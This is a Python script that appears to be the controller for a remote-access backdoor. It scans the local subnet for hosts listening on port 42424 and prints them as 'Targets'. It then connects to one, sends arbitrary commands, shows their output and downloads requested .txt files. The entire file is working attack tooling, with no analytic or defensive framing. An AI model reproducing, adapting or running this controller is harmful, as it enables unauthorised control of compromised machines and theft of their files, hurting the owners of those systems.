from operator import concat
import socket

def targets():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)[:-3]
    PORT = 42424
    print("Targets:")
    for host in range(1,255):
        host = concat(IPAddr,str(host))
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(0.025)

        pOpen = str(server.connect_ex((host,PORT)))
        if pOpen == '0':
            print(concat("[+] ",host))
        server.close()

def connection(cache)->socket:
    socket.setdefaulttimeout(1.5)
    server = socket.socket()
    if cache == '':
        host = input('H:')
    else:
        host = cache
    server.connect((host,42424)) 
    return server, host
        

if __name__ == '__main__':
    cache = ''
    targets()
    while True:
        server, cache = connection(cache)
        command = input("C: ")
        if command == '.conn':
            server.close()
            cache = ''
        elif command.endswith('.txt'):
            server.send(command.encode())
            with open(command, "wb") as file:
                while True:
                    bytes_reads = server.recv(1024)
                    if not bytes_reads:    
                        break
                    file.write(bytes_reads)
        else:
            server.send(command.encode())
            print ("R: ")
            while True:
                bytes_reads = server.recv(1024).decode("unicode_escape")
                if not bytes_reads:    
                    break
                print(bytes_reads)
        server.close()